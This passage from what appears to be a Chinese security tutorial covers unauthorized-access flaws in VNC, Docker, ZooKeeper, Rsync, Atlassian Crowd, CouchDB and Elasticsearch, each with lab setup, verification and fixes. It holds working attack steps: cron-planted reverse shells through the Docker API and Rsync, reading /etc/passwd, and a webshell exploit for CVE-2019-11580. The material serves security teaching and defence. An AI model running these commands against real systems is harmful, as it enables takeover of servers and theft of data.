alt=\"image-20200702154726454\"></p>\n<h5 id=\"漏洞修复-4\"><a href=\"#漏洞修复-4\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、jmx控制页面访问添加访问验证</p>\n<p>2、JMX Console 安全配置</p>\n<h4 id=\"VNC-未授权访问\"><a href=\"#VNC-未授权访问\" class=\"headerlink\" title=\"VNC 未授权访问\"></a>VNC 未授权访问</h4><h5 id=\"漏洞描述-5\"><a href=\"#漏洞描述-5\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制target主机。</p>\n<h5 id=\"漏洞验证-5\"><a href=\"#漏洞验证-5\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">需要用gnome桌面，如果服务器安装时使用的最小化安装，那么进行下面操作按章GNOME 桌面</span><br><span class=\"line\">yum grouplist\t\t\t\t\t\t\t\t\t\t\t\t\t\t# 列出的组列表里有GNOME Desktop</span><br><span class=\"line\">yum groupinstall -y &quot;GNOME Desktop&quot;\t\t\t# 安装</span><br><span class=\"line\">systemctl set-default graphical.target  //设置成图形模式</span><br><span class=\"line\">systemctl set-default multi-user.target  //设置成命令模式</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 然后重启即可，或者startx开启图形界面。第一次启动可能时间会长一点，耐心等待即可。</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum install tigervnc-server -y</span></span><br><span class=\"line\">//新建服务配置模版</span><br><span class=\"line\">cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service</span><br><span class=\"line\">vim /etc/systemd/system/vncserver@\\:1.service</span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Remote desktop service (VNC)</span><br><span class=\"line\">After=syslog.target network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=forking</span><br><span class=\"line\">User=root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Clean any existing files <span class=\"keyword\">in</span> /tmp/.X11-unix environment</span></span><br><span class=\"line\">ExecStartPre=-/usr/bin/vncserver -kill %i</span><br><span class=\"line\">ExecStart=/sbin/runuser -l root -c &quot;/usr/bin/vncserver %i&quot;</span><br><span class=\"line\">PIDFile=/root/.vnc/%H%i.pid</span><br><span class=\"line\">ExecStop=-/usr/bin/vncserver -kill %i</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>1、端口检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> netstat -ant | grep 5901</span></span><br><span class=\"line\">tcp        0      0 0.0.0.0:5901            0.0.0.0:*               LISTEN</span><br><span class=\"line\">tcp6       0      0 :::5901                 :::*                    LISTEN</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709155404841.png\" alt=\"image-20200709155404841\"></p>\n<p>2、取消鉴权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//先停掉服务</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> sudo vncserver -<span class=\"built_in\">kill</span> :1</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vncserver :1 -SecurityTypes=none</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709162439146.png\" alt=\"image-20200709162439146\"></p>\n<h5 id=\"漏洞修复-5\"><a href=\"#漏洞修复-5\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、添加用户认证</p>\n<p>2、以最小普通权限身份运行操作系统</p>\n<h4 id=\"Docker-未授权访问\"><a href=\"#Docker-未授权访问\" class=\"headerlink\" title=\"Docker 未授权访问\"></a>Docker 未授权访问</h4><h5 id=\"漏洞描述-6\"><a href=\"#漏洞描述-6\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Docker 是一个开源的引擎可以轻松地为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署包括 VMs、bare metal、OpenStack 集群和其他的基础应用平台Docker。</p>\n<p>​        Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>\n<h5 id=\"漏洞验证-6\"><a href=\"#漏洞验证-6\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//pip安装</span><br><span class=\"line\">[root@localhost ~]# yum -y install epel-release</span><br><span class=\"line\">[root@localhost ~]# yum -y install python-pip</span><br><span class=\"line\">[root@localhost ~]# pip install --upgrade pip</span><br><span class=\"line\">[root@localhost ~]# pip install docker-compose</span><br><span class=\"line\">[root@localhost ~]# yum install docker</span><br><span class=\"line\">mkdir docker</span><br><span class=\"line\">cd docker </span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/Dockerfile</span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-compose.yml</span><br><span class=\"line\">wget https://raw.githubusercontent.com/vulhub/vulhub/master/docker/unauthorized-rce/docker-entrypoint.sh</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class=\"line\">ERROR: Couldn&#x27;t connect to Docker daemon at http+docker://localhost - is it running?</span><br><span class=\"line\"></span><br><span class=\"line\">If it&#x27;s at a non-standard location, specify the URL with the DOCKER_HOST environment variable.</span><br><span class=\"line\">//报以上报错因服务未启动</span><br><span class=\"line\">[root@localhost docker]# sudo systemctl start docker</span><br><span class=\"line\">//编译并启动</span><br><span class=\"line\">[root@localhost docker]# docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706155443054.png\" alt=\"image-20200706155443054\"></p>\n<p>1、未授权访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;nmap端口检测</span><br><span class=\"line\">➜  Desktop sudo nmap -sS -p 1-65535 -v 172.16.144.135</span><br><span class=\"line\">&#x2F;&#x2F;获取远程docker信息</span><br><span class=\"line\">➜  Desktop docker -H tcp:&#x2F;&#x2F;172.16.144.135:2375 version</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706155712528.png\" alt=\"image-20200706155712528\"></p>\n<p>2、反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure>\n\n<p>启动容器</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -H tcp://172.16.144.135:2375 run -id -v /etc/crontabs:/tmp alpine:latest</span><br><span class=\"line\">//主要查看images id值</span><br><span class=\"line\">docker -H tcp://172.16.144.135:2375 ps</span><br><span class=\"line\">//进入进程shell</span><br><span class=\"line\">docker -H tcp://172.16.144.135:2375 exec -it fd986b9a93f2 sh\t\t//image id 必须本地拉取新的id值</span><br><span class=\"line\">//新建计划任务</span><br><span class=\"line\">echo &#x27;* * * * * /usr/bin/nc 172.16.144.135 9988 -e /bin/sh&#x27; &gt;&gt; /tmp/root</span><br><span class=\"line\">//获取计划任务信息列表</span><br><span class=\"line\">cat /tmp/root</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707103740566.png\" alt=\"image-20200707103740566\"></p>\n<p>反弹成功</p>\n<p><img src=\"/images/Unauthorized/image-20200707103806562.png\" alt=\"image-20200707103806562\"></p>\n<p>3、未授权访问检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//此脚本可以检测未授权访问漏洞，反弹shell未实验</span><br><span class=\"line\">https://github.com/Tycx2ry/docker_api_vul</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞修复-6\"><a href=\"#漏洞修复-6\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、2375端口做网络访问控制</p>\n<p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p>\n<h4 id=\"ZooKeeper-未授权访问\"><a href=\"#ZooKeeper-未授权访问\" class=\"headerlink\" title=\"ZooKeeper 未授权访问\"></a>ZooKeeper 未授权访问</h4><h5 id=\"漏洞描述-7\"><a href=\"#漏洞描述-7\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Zookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p>\n<h5 id=\"漏洞验证-7\"><a href=\"#漏洞验证-7\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz</span><br><span class=\"line\">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class=\"line\">cd zookeeper-3.4.14/conf</span><br><span class=\"line\">mv zoo_sample.cfg zoo.cfg</span><br><span class=\"line\">../bin/zkServer.sh start\t//服务启动</span><br><span class=\"line\">../bin/zkServer.sh stop\t  //服务停止</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707111251952.png\" alt=\"image-20200707111251952\"></p>\n<p>1、未授权访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo envi|nc 172.16.144.135 2181</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707111357506.png\" alt=\"image-20200707111357506\"></p>\n<p>2、ZooKeeper可视化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;issues.apache.org&#x2F;jira&#x2F;secure&#x2F;attachment&#x2F;12436620&#x2F;ZooInspector.zip</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707111758244.png\" alt=\"image-20200707111758244\"></p>\n<p><img src=\"/images/Unauthorized/image-20200707112356764.png\" alt=\"image-20200707112356764\"></p>\n<h5 id=\"漏洞修复-7\"><a href=\"#漏洞修复-7\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、修改 ZooKeeper 默认端口，采用其他端口服务</p>\n<p>2、添加访问控制，配置服务来源地址限制策略</p>\n<p>3、增加 ZooKeeper 的认证配置</p>\n<h4 id=\"Rsync-未授权访问\"><a href=\"#Rsync-未授权访问\" class=\"headerlink\" title=\"Rsync 未授权访问\"></a>Rsync 未授权访问</h4><h5 id=\"漏洞描述-8\"><a href=\"#漏洞描述-8\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 <code>837</code>。</p>\n<h5 id=\"漏洞验证-8\"><a href=\"#漏洞验证-8\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//下载项目</span><br><span class=\"line\">https://github.com/vulhub/vulhub/tree/master/rsync/common</span><br><span class=\"line\">//启动容器</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker ps -a</span></span><br><span class=\"line\">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class=\"line\">5c1eb59de4a8        common_rsync        &quot;/docker-entrypoin...&quot;   13 seconds ago      Up 12 seconds       0.0.0.0:873-&gt;873/tcp   common_rsync_1</span><br></pre></td></tr></table></figure>\n\n<p>1、未授权检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> rsync rsync://&#123;target_ip&#125;/</span></span><br><span class=\"line\">➜  Downloads rsync rsync://172.16.144.135:873/</span><br><span class=\"line\">src            \tsrc path</span><br><span class=\"line\">//下载文件至本地</span><br><span class=\"line\">➜  Downloads rsync rsync://172.16.144.135:873/src/etc/passwd ./</span><br></pre></td></tr></table></figure>\n\n<p>2、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载crontab配置文件</span></span><br><span class=\"line\">rsync rsync://172.16.2.250:873/src/etc/crontab ./</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 该环境crontab中</span></span><br><span class=\"line\">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class=\"line\">表示每小时的第17分钟执行run-parts --report /etc/cron.hourly</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 写入bash并赋权</span></span><br><span class=\"line\">vim nc</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/172.16.144.135/9999 0&gt;&amp;1</span><br><span class=\"line\">chmod 777 nc</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 将文件上传至/etc/cron.hourly</span></span><br><span class=\"line\">rsync -av nc rsync://172.16.144.135:873/src/etc/cron.hourly</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707115044398.png\" alt=\"image-20200707115044398\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 本地监听9999</span></span><br><span class=\"line\">nc -lnvp 9999</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200707121738127.png\" alt=\"image-20200707121738127\"></p>\n<h5 id=\"漏洞修复-8\"><a href=\"#漏洞修复-8\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、账户认证：正确配置认证用户名及密码</p>\n<p>2、权限控制：使用合理的权限</p>\n<p>3、网络访问控制：控制接入源ip</p>\n<p>4、数据加密传输等</p>\n<h4 id=\"Atlassian-Crowd-未授权访问\"><a href=\"#Atlassian-Crowd-未授权访问\" class=\"headerlink\" title=\"Atlassian Crowd 未授权访问\"></a>Atlassian Crowd 未授权访问</h4><h5 id=\"漏洞描述-9\"><a href=\"#漏洞描述-9\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。</p>\n<h5 id=\"漏洞验证-9\"><a href=\"#漏洞验证-9\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip</span><br><span class=\"line\">unzip atlassian-crowd-3.4.3.zip</span><br><span class=\"line\">cd atlassian-crowd-3.4.3</span><br><span class=\"line\">vim crowd-webapp/WEB-INF/classes/crowd-init.properties</span><br><span class=\"line\">//取消注释</span><br><span class=\"line\">crowd.home=/var/crowd-home</span><br></pre></td></tr></table></figure>\n\n<p>执行“Set up Crowd”</p>\n<p><img src=\"/images/Unauthorized/image-20200708113709624.png\" alt=\"image-20200708113709624\"></p>\n<p>申请30天试用<a href=\"https://my.atlassian.com/products/index\">license</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://my.atlassian.com/license/evaluation?utm_nooverride=1&amp;product=Crowd&amp;version=3.4.3&amp;sid=Server ID&amp;ref=prod</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200708120448211.png\" alt=\"image-20200708120448211\"></p>\n<p>如下图所示：安装成功</p>\n<p><img src=\"/images/Unauthorized/image-20200708133857021.png\" alt=\"image-20200708133857021\"></p>\n<p>1、未授权测试</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  Atlassian git clone https://github.com/jas502n/CVE-2019-11580.git</span><br><span class=\"line\">➜  CVE-2019-11580 git:(master) sudo python CVE-2019-11580.py http://172.16.144.135:8095/</span><br><span class=\"line\">http://172.16.144.135:8095//crowd/admin/uploadplugin.action</span><br><span class=\"line\"></span><br><span class=\"line\">Installed plugin /root/atlassian-crowd-3.4.3/apache-tomcat/temp/plugindev-3858334950456985130rce.jar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&gt;&gt;Get Webshell\t\t\t//已经getshell</span></span><br><span class=\"line\"></span><br><span class=\"line\">http://172.16.144.135:8095//crowd/plugins/servlet/exp?cmd=whoami</span><br><span class=\"line\"></span><br><span class=\"line\">Exec command= whoami</span><br><span class=\"line\"></span><br><span class=\"line\">Result= root</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200708134835246.png\" alt=\"image-20200708134835246\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  CVE-2019-11580 git:(master) curl http://172.16.144.135:8095//crowd/plugins/servlet/exp\\?cmd\\=id</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞修复-9\"><a href=\"#漏洞修复-9\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、设置访问/crowd/admin/uploadplugin.action的源ip</p>\n<p>2、版本升级</p>\n<h4 id=\"CouchDB-未授权访问\"><a href=\"#CouchDB-未授权访问\" class=\"headerlink\" title=\"CouchDB 未授权访问\"></a>CouchDB 未授权访问</h4><h5 id=\"漏洞描述-10\"><a href=\"#漏洞描述-10\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）,默认会在<code>5984</code>端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。</p>\n<p>​    在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生</p>\n<h5 id=\"漏洞验证-10\"><a href=\"#漏洞验证-10\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> mkdir couchdb</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/docker-compose.yml</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker-compose build &amp;&amp; docker-compose up -d</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709010005589.png\" alt=\"image-20200709010005589\"></p>\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://127.0.0.1:5984</span><br><span class=\"line\">curl http://127.0.0.1:5984/_config</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709005955776.png\" alt=\"image-20200709005955776\"></p>\n<p><img src=\"/images/Unauthorized/image-20200709010449342.png\" alt=\"image-20200709010449342\"></p>\n<h5 id=\"漏洞修复-10\"><a href=\"#漏洞修复-10\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、添加认证入口</p>\n<h4 id=\"Elasticsearch-未授权访问\"><a href=\"#Elasticsearch-未授权访问\" class=\"headerlink\" title=\"Elasticsearch 未授权访问\"></a>Elasticsearch 未授权访问</h4><h5 id=\"漏洞描述-11\"><a href=\"#漏洞描述-11\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。<br>  Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。</p>\n<h5 id=\"漏洞验证-11\"><a href=\"#漏洞验证-11\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ElasticSearch必须jdk8</span><br><span class=\"line\">//新建用户</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> useradd elasticsearch</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> passwd elasticsearch</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> su elasticsearch</span></span><br><span class=\"line\">[elasticsearch@localhost ~]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip elasticsearch-5.5.0.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> /elasticsearch-5.5.0/bin</span></span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ./elasticsearch -d</span></span><br></pre></td></tr></table></figure>\n\n<p>1、未授权访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> curl  127.0.0.1:9200</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200708235939239.png\" alt=\"image-20200708235939239\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> curl http://172.16.144.135:9200/_nodes</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200709002204225.png\" alt=\"image-20200709002204225\"></p>\n<h5 id=\"漏洞修复-11\"><a href=\"#漏洞修复-11\" class=\"headerlink\" 